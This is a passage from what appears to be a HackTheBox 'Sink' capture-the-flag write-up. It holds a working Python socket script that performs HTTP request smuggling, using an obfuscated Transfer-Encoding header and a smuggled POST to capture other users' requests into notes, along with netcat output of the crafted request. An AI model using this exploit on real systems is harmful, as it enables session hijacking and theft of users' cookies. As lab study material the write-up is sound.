## Smuggling HTTP Request
## I’ll write a Python script to generate this packet. I can’t use requests or modules that create well-formed HTTP requests, so I’ll use socket. First, I’ll point it back at myself to see how the request looks:
## https://0xdf.gitlab.io/2021/09/18/htb-sink.html
####################################################
##
##

#!/usr/bin/env python3

import socket


host = "127.0.0.1"
port = 5000

body = f"""0

POST /notes HTTP/1.1
Host: {host}:{port}
Referer: http://10.10.10.225:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=""".replace('\n','\r\n')

header = f"""GET / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Transfer-Encoding: \x0bchunked

""".replace('\n','\r\n')

request = (header + body).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)
    
#######################################
##
##
    
Sending this to myself with nc listening, I can see the request:

oxdf@parrot$ nc -lnp 5000 
GET / HTTP/1.1
Host: 127.0.0.1:5000
Content-Length: 230
Transfer-Encoding: 
                   chunked

0

POST /notes HTTP/1.1
Host: 127.0.0.1:5000
Referer: http://10.10.10.225:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=
It looks good! It’s important to note that I’m giving the second request a valid session cookie so that the results show up under my notes.

Send Smuggle
Now I’ll change the host from localhost to 10.10.10.225, and give it a run. I also found it was much more reliable if I put a time.sleep(5) in before the socket closes. After the script completes, I’ll refresh the page to see if any note show up, and there’s a new one:
